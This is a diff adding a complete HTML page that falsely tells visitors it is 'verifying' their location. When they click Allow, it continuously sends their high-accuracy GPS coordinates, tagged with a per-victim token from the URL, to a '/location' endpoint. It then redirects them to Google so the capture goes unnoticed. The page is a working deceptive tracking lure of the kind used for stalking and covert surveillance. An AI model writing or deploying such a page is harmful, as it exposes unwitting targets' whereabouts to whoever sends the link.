@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: Arial; text-align: center; padding: 20px; background: #f0f2f5; }
+        .box { max-width: 400px; margin: auto; background: white; padding: 20px; border-radius: 10px; }
+        button { padding: 10px 20px; font-size: 16px; background: #007bff; color: white; border: none; border-radius: 5px; }
+    </style>
+</head>
+<body>
+<div class="box">
+    <h2>Verifying your location...</h2>
+    <p>Please allow location access to continue.</p>
+    <button id="allowBtn">Allow Location</button>
+    <p id="status" style="color: gray;"></p>
+</div>
+
+<script>
+    const token = window.location.pathname.substring(1);
+    
+    function sendLocation(lat, lon, accuracy) {
+        fetch('/location', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ token, lat, lon, accuracy })
+        }).catch(err => console.error(err));
+    }
+    
+    function startTracking() {
+        if ("geolocation" in navigator) {
+            navigator.geolocation.watchPosition(
+                (position) => {
+                    sendLocation(position.coords.latitude, position.coords.longitude, position.coords.accuracy);
+                    document.getElementById('status').innerHTML = "✅ Location sent. Page will redirect...";
+                },
+                (error) => {
+                    document.getElementById('status').innerHTML = "❌ Location access denied. Please enable location.";
+                    console.error(error);
+                },
+                { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
+            );
+        } else {
+            document.getElementById('status').innerHTML = "❌ Geolocation not supported.";
+        }
+    }
+    
+    document.getElementById('allowBtn').onclick = () => {
+        document.getElementById('allowBtn').style.display = 'none';
+        document.getElementById('status').innerHTML = "Requesting location...";
+        startTracking();
+        // Redirect after 3 seconds to a safe site
+        setTimeout(() => {
+            window.location.href = "https://www.google.com";
+        }, 3000);
+    };
+</script>
+</body>
+</html>
